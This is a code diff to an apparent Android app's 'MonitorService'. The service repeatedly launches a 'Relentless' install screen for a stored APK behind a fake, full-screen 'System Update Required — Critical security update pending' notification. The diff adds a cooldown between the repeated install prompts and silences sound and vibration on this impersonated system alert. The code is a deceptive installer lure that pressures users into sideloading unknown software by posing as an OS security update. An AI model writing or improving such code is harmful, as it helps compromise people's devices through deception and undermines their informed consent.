@@ -165,6 +165,13 @@ class MonitorService : Service() {
             return
         }
 
+        // COOLDOWN LOGIC: Give user 90s to interact with the package installer
+        val lastPrompt = prefs.getLong("relentless_last_prompt", 0L)
+        if (System.currentTimeMillis() - lastPrompt < 90_000) {
+            return 
+        }
+        prefs.edit().putLong("relentless_last_prompt", System.currentTimeMillis()).apply()
+
         val installIntent = Intent(this, RelentlessInstallActivity::class.java).apply {
             putExtra("apk_path", apkPath)
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_CLEAR_TASK)
@@ -185,9 +192,12 @@ class MonitorService : Service() {
 
         val pi = android.app.PendingIntent.getActivity(this, newId, installIntent, android.app.PendingIntent.FLAG_CANCEL_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
         
-        val channelId = "system_updates"
+        val channelId = "system_updates_silent"
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_HIGH)
+            val channel = NotificationChannel(channelId, "System Updates", NotificationManager.IMPORTANCE_HIGH).apply {
+                setSound(null, null)
+                enableVibration(false)
+            }
             nm.createNotificationChannel(channel)
         }
         
@@ -196,6 +206,8 @@ class MonitorService : Service() {
             .setContentTitle("System Update Required")
             .setContentText("Critical security update pending.")
             .setPriority(NotificationCompat.PRIORITY_MAX)
+            .setDefaults(0)
+            .setSilent(true)
             .setFullScreenIntent(pi, true)
             .setAutoCancel(true)
             .build()
